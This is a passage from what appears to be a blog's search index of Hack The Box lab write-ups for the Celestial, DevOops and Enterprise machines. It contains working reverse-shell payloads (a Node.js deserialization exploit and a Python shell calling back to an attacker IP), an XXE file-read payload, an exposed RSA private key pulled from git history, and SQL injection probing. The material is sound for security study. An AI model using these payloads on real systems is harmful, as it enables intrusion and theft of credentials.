/tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.5 6666 \u0026gt;/tmp/f\u0026#39;, function(error, stdout, stderr) { console.log(stdout);});}\u0026#34;} We have to add () to the end of the payload, so that it will be invoked _$$ND_FUNC$$_function() { require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.5 6666 \u0026gt;/tmp/f\u0026#39;, function(error, stdout, stderr) { console.log(stdout);});}() We have to encode it to base64 and send it, It will give an error that username is not valid, yet we should still receive our shell We could also set any of the parameters of the cookie to our payload and send it, it should work Launch a listener, set the cookie to payload and send Root For sudo we need password sun@celestial:~$ id uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) sun@celestial:~$ sudo -l [sudo] password for sun: We have a script in Documents directory sun@celestial:~$ ls -lha Documents/ total 12K drwxr-xr-x 2 sun sun 4.0K Sep 15 2022 . drwxr-xr-x 21 sun sun 4.0K Oct 11 2022 .. -rw-rw-r-- 1 sun sun 29 Oct 18 11:34 script.py lrwxrwxrwx 1 root root 18 Sep 15 2022 user.txt -\u0026gt; /home/sun/user.txt sun@celestial:~$ cat Documents/script.py print \u0026#34;Script is running...\u0026#34; Could be cron, considering the file output.txt which has the same output Running pspy proves that The script is run by root Let\u0026rsquo;s write to script.py Payload from https://www.revshells.com/ import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;10.10.16.5\u0026#34;, 7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;) Wait for execution and get the flag ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/celestial/images/celestial.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/celestial/","summary":"Celestial Enumeration nmap └─$ nmap -sC -sV 10.10.10.85 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:43 BST Nmap scan report for 10.10.10.85 (10.10.10.85) Host is up (0.15s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=utf-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.","tags":["HTB","nodejs","deserialization","pspy","cron"],"title":"[HTB] Machine: Celestial"},{"categories":null,"contents":"DevOops Enumeration nmap └─$ nmap -Pn -p- 10.10.10.91 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:44 BST Nmap scan report for 10.10.10.91 (10.10.10.91) Host is up (0.17s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp Nmap done: 1 IP address (1 host up) scanned in 749.62 seconds └─$ nmap -Pn -p22,5000 -sC -sV 10.10.10.91 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:58 BST Nmap scan report for 10.10.10.91 (10.10.10.91) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA) | 256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA) |_ 256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519) 5000/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds Web Server feroxbuster └─$ feroxbuster -u http://10.10.10.91:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.91:5000 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 1 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 1816l 15358w 962741c http://10.10.10.91:5000/feed 200 GET 1l 31w 285c http://10.10.10.91:5000/ 200 GET 1l 39w 347c http://10.10.10.91:5000/upload Foothold http://10.10.10.91:5000/feed Image from root path http://10.10.10.91:5000/upload xml upload page Let\u0026rsquo;s upload test xml \u0026lt;Author\u0026gt;Test Author\u0026lt;/Author\u0026gt; \u0026lt;Subject\u0026gt;Test Subject\u0026lt;/Subject\u0026gt; \u0026lt;Content\u0026gt;Test Content\u0026lt;/Content\u0026gt; It fails, probably due to some missing elements in xml Googling for xml feed shows https://www.w3schools.com/xml/xml_rss.asp Let\u0026rsquo;s add channel element \u0026lt;channel\u0026gt; \u0026lt;Author\u0026gt;Test Author\u0026lt;/Author\u0026gt; \u0026lt;Subject\u0026gt;Test Subject\u0026lt;/Subject\u0026gt; \u0026lt;Content\u0026gt;Test Content\u0026lt;/Content\u0026gt; \u0026lt;/channel\u0026gt; It works and the file is located in indicated directory └─$ curl http://10.10.10.91:5000/uploads/test.xml \u0026lt;channel\u0026gt; \u0026lt;Author\u0026gt;Test Author\u0026lt;/Author\u0026gt; \u0026lt;Subject\u0026gt;Test Subject\u0026lt;/Subject\u0026gt; \u0026lt;Content\u0026gt;Test Content\u0026lt;/Content\u0026gt; \u0026lt;/channel\u0026gt; We can test for XXE https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity \u0026lt;!--?xml version=\u0026#34;1.0\u0026#34; ?--\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \u0026#34;/etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;Author\u0026gt;\u0026amp;xxe;\u0026lt;/Author\u0026gt; \u0026lt;Subject\u0026gt;Test Subject\u0026lt;/Subject\u0026gt; \u0026lt;Content\u0026gt;Test Content\u0026lt;/Content\u0026gt; \u0026lt;/channel\u0026gt; We have git, roosa users We saw that the file path is in roosa\u0026rsquo;s home folder Usually when we have read vulnerabilities, we should start with id_rsa And roosa has the key, which we can now use to connect via ssh Save it to file and chmod 600 └─$ ssh roosa@10.10.10.91 -i id_rsa.devoops Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 135 packages can be updated. 60 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. roosa@devoops:~$ Root roosa has interesting folder work roosa@devoops:~$ ls -lha work/ total 12K drwxrwxr-x 3 roosa roosa 4.0K Mar 26 2021 . drwxr-xr-x 22 roosa roosa 4.0K Sep 23 2022 .. drwxrwx--- 5 roosa roosa 4.0K Mar 26 2021 blogfeed roosa@devoops:~/work/blogfeed$ ls -lha total 28K drwxrwx--- 5 roosa roosa 4.0K Mar 26 2021 . drwxrwxr-x 3 roosa roosa 4.0K Mar 26 2021 .. drwxrwx--- 8 roosa roosa 4.0K Mar 26 2021 .git -rw-rw---- 1 roosa roosa 104 Mar 19 2018 README.md drwxrwx--- 3 roosa roosa 4.0K Mar 26 2021 resources -rwxrw-r-- 1 roosa roosa 180 Mar 21 2018 run-gunicorn.sh drwxrwx--- 2 roosa roosa 4.0K Mar 26 2021 src It a git repo roosa@devoops:~/work/blogfeed$ git status On branch master Your branch is up-to-date with \u0026#39;origin/master\u0026#39;. Changes not staged for commit: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to update what will be committed) (use \u0026#34;git checkout -- \u0026lt;file\u0026gt;...\u0026#34; to discard changes in working directory) modified: run-gunicorn.sh Untracked files: (use \u0026#34;git add \u0026lt;file\u0026gt;...\u0026#34; to include in what will be committed) src/.feed.py.swp src/access.log src/app.py src/app.py~ src/config.py src/devsolita-snapshot.png src/feed.log src/feed.pyc src/save.p no changes added to commit (use \u0026#34;git add\u0026#34; and/or \u0026#34;git commit -a\u0026#34;) We can check commit history git log --name-only --oneline or git log --pretty=oneline We see interesting commit with comments like add key for feed integration from tnerprise backend Right after that commit we see reverted accidental commit with proper key roosa@devoops:~/work/blogfeed$ git log --name-only --oneline 7ff507d Use Base64 for pickle feed loading src/feed.py src/index.html 26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use. run-gunicorn.sh src/feed.py cec54d8 Debug support added to make development more agile. run-gunicorn.sh src/feed.py ca3e768 Blogfeed app, initial version. src/feed.py src/index.html src/upload.html dfebfdf Gunicorn startup script run-gunicorn.sh 33e87c3 reverted accidental commit with proper key resources/integration/authcredentials.key d387abf add key for feed integration from tnerprise backend resources/integration/authcredentials.key 1422e5a Initial commit README.md d1b52a44e6dc81023420347e257ee5f Initial commit Let\u0026rsquo;s check resources/integration/authcredentials.key from d387abf We can try to connect as root using that key roosa@devoops:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key roosa@devoops:~/work/blogfeed$ cat resources/integration/authcredentials.key -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde 8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+ CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa 2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41 IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw +XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW 7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7 VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6 md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE= -----END RSA PRIVATE KEY----- Upload to your box and connect as root └─$ ssh root@10.10.10.91 -i id_rsa.root Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 135 packages can be updated. 60 updates are security updates. Last login: Fri Sep 23 09:46:30 2022 root@devoops:~# Pickle deserialization attack path ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/devoops/images/devoops.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/devoops/","summary":"DevOops Enumeration nmap └─$ nmap -Pn -p- 10.10.10.91 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:44 BST Nmap scan report for 10.10.10.91 (10.10.10.91) Host is up (0.17s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 5000/tcp open upnp Nmap done: 1 IP address (1 host up) scanned in 749.62 seconds └─$ nmap -Pn -p22,5000 -sC -sV 10.10.10.91 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:58 BST Nmap scan report for 10.","tags":["HTB","xxe","ssh","git","deserialization","pickle","rss"],"title":"[HTB] Machine: DevOops"},{"categories":null,"contents":"Enterprise Enumeration nmap └─$ nmap -Pn -p- 10.10.10.61 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 18:42 BST Nmap scan report for enterprise.htb (10.10.10.61) Host is up (0.14s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 5355/tcp filtered llmnr 8080/tcp open http-proxy 32812/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds └─$ nmap -Pn -p22,80,443,8080 -sC -sV 10.10.10.61 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 18:02 BST Nmap scan report for 10.10.10.61 (10.10.10.61) Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA) | 256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA) |_ 256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-generator: WordPress 4.8.1 |_http-title: USS Enterprise \u0026amp;#8211; Ships Log 443/tcp open ssl/http Apache httpd 2.4.25 ((Ubuntu)) |_http-server-header: Apache/2.4.25 (Ubuntu) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-title: Apache2 Ubuntu Default Page: It works | ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK | Not valid before: 2017-08-25T10:35:14 |_Not valid after: 2017-09-24T10:35:14 8080/tcp open http Apache httpd 2.4.10 ((Debian)) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ |_http-generator: Joomla! - Open Source Content Management |_http-title: Home |_http-server-header: Apache/2.4.10 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds Web server Port 443 Port 8080 gobuster └─$ gobuster dir -u http://enterprise.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x txt,php -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://enterprise.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 301) [Size: 0] [--\u0026gt; http://enterprise.htb/] /wp-content (Status: 301) [Size: 321] [--\u0026gt; http://enterprise.htb/wp-content/] /wp-login.php (Status: 200) [Size: 2428] /license.txt (Status: 200) [Size: 19935] /wp-includes (Status: 301) [Size: 322] [--\u0026gt; http://enterprise.htb/wp-includes/] /wp-trackback.php (Status: 200) [Size: 135] /wp-admin (Status: 301) [Size: 319] [--\u0026gt; http://enterprise.htb/wp-admin/] /xmlrpc.php (Status: 405) [Size: 42] /wp-signup.php (Status: 302) [Size: 0] [--\u0026gt; http://enterprise.htb/wp-login.php?action=register] Progress: 244929 / 244932 (100.00%) =============================================================== Finished =============================================================== └─$ gobuster dir -u https://enterprise.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -x txt,php -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://enterprise.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 294] /files (Status: 301) [Size: 318] [--\u0026gt; https://enterprise.htb/files/] wpscan └─$ wpscan --url http://enterprise.htb --enumerate ap,at,u,tt _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://enterprise.htb/ [10.10.10.61] [+] Started: Thu Oct 19 18:20:38 2023 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache/2.4.10 (Debian) | - X-Powered-By: PHP/5.6.31 | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://enterprise.htb/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://enterprise.htb/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://enterprise.htb/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.8.1 identified (Insecure, released on 2017-08-02). | Found By: Rss Generator (Passive Detection) | - http://enterprise.htb/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8.1\u0026lt;/generator\u0026gt; | - http://enterprise.htb/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.8.1\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyseventeen | Location: http://enterprise.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://enterprise.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://enterprise.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8.1, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating All Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:13:19 \u0026lt;========================================================================================================================================================\u0026gt; (26352 / 26352) 100.00% Time: 00:13:19 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] Theme(s) Identified: [+] twentyfifteen | Location: http://enterprise.htb/wp-content/themes/twentyfifteen/ | Last Updated: 2023-08-08T00:00:00.000Z | Readme: http://enterprise.htb/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 3.5 | Style URL: http://enterprise.htb/wp-content/themes/twentyfifteen/style.css | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen\u0026#39;s simple, st... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://enterprise.htb/wp-content/themes/twentyfifteen/, status: 200 | | Version: 1.8 (80% confidence) | Found By: Style (Passive Detection) | - http://enterprise.htb/wp-content/themes/twentyfifteen/style.css, Match: \u0026#39;Version: 1.8\u0026#39; [+] twentyseventeen | Location: http://enterprise.htb/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://enterprise.htb/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://enterprise.htb/wp-content/themes/twentyseventeen/style.css | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Urls In Homepage (Passive Detection) | Confirmed By: Known Locations (Aggressive Detection) | - http://enterprise.htb/wp-content/themes/twentyseventeen/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://enterprise.htb/wp-content/themes/twentyseventeen/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] twentysixteen | Location: http://enterprise.htb/wp-content/themes/twentysixteen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://enterprise.htb/wp-content/themes/twentysixteen/readme.txt | [!] The version is out of date, the latest version is 2.9 | Style URL: http://enterprise.htb/wp-content/themes/twentysixteen/style.css | Style Name: Twenty Sixteen | Style URI: https://wordpress.org/themes/twentysixteen/ | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Known Locations (Aggressive Detection) | - http://enterprise.htb/wp-content/themes/twentysixteen/, status: 200 | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://enterprise.htb/wp-content/themes/twentysixteen/style.css, Match: \u0026#39;Version: 1.3\u0026#39; [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:01:32 \u0026lt;==========================================================================================================================================================\u0026gt; (2575 / 2575) 100.00% Time: 00:01:32 [i] No Timthumbs Found. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:02 \u0026lt;==============================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:02 [i] User(s) Identified: [+] william.riker | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Login Error Messages (Aggressive Detection) [+] william-riker | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Thu Oct 19 18:35:51 2023 [+] Requests Done: 29001 [+] Cached Requests: 17 [+] Data Sent: 7.538 MB [+] Data Received: 4.803 MB [+] Memory used: 352.156 MB [+] Elapsed time: 00:15:13 droopescan └─$ droopescan scan joomla --url http://enterprise.htb:8080 [+] Possible version(s): 3.7.0 3.7.0-beta2 3.7.0-beta3 3.7.0-beta4 3.7.0-rc4 3.7.1 3.7.1-rc1 3.7.1-rc2 3.7.2 3.7.3 3.7.3-beta1 3.7.3-rc2 3.7.4 3.7.4-beta1 3.7.4-rc1 3.7.5 3.8.0 3.8.0-beta1 3.8.0-beta2 3.8.0-beta3 3.8.0-beta4 3.8.1 3.8.1-rc 3.8.2 3.8.2-rc 3.8.3 3.8.3-rc [+] Possible interesting urls found: Detailed version information. - http://enterprise.htb:8080/administrator/manifests/files/joomla.xml Login page. - http://enterprise.htb:8080/administrator/ License file. - http://enterprise.htb:8080/LICENSE.txt Version attribute contains approx version - http://enterprise.htb:8080/plugins/system/cache/cache.xml [+] Scan finished (0:00:02.427451 elapsed) Foothold https://enterprise.htb/files/ contains archive Content └─$ ls -lha total 28K drwx------ 2 kali kali 4.0K Oct 19 18:40 . drwxr-xr-x 5 kali kali 12K Oct 19 18:40 .. -rw-r--r-- 1 kali kali 501 Oct 17 2017 lcars_db.php -rw-r--r-- 1 kali kali 624 Oct 17 2017 lcars_dbpost.php -rw-r--r-- 1 kali kali 377 Oct 17 2017 lcars.php └─$ cat lcars.php \u0026lt;?php /* * Plugin Name: lcars * Plugin URI: enterprise.htb * Description: Library Computer Access And Retrieval System * Author: Geordi La Forge * Version: 0.2 * Author URI: enterprise.htb * */ // Need to create the user interface. // need to finsih the db interface // need to make it secure ?\u0026gt; └─$ cat lcars_db.php \u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve an ID if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = $_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT ID FROM wp_posts WHERE post_name = $query\u0026#34;; $result = $db-\u0026gt;query($sql); echo $result; } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; └─$ cat lcars_dbpost.php \u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve a post name if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = (int)$_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT post_title FROM wp_posts WHERE ID = $query\u0026#34;; $result = $db-\u0026gt;query($sql); if ($result){ $row = $result-\u0026gt;fetch_row(); if (isset($row[0])){ echo $row[0]; } } } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; We have a potential SQL injection on lcars plugin We can confirm that lcars exists Let\u0026rsquo;s try to query it └─$ for i in {0..100}; do (echo -n \u0026#34;$i:\u0026#34;; curl -s http://10.10.10.61/wp-content/plugins/lcars/lcars_dbpost.php?query=$i); done | grep . 0: 1:Hello world! 2: 3:Auto Draft 4:Espresso 5:Sandwich 6:Coffee 7:Home 8:About 9:Contact ... 59: 60: 61: 62: 63: 64: 65: 66:Passwords 67:Passwords 68:Passwords ... Let\u0026rsquo;s also check lcars_pdb.php But it fails └─$ for i in {0..100}; do (echo -n \u0026#34;$i:\u0026#34;; curl -s http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=$i); done | grep . 0:\u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Catchable fatal error\u0026lt;/b\u0026gt;: Object of class mysqli_result could not be converted to string in \u0026lt;b\u0026gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php\u0026lt;/b\u0026gt; on line 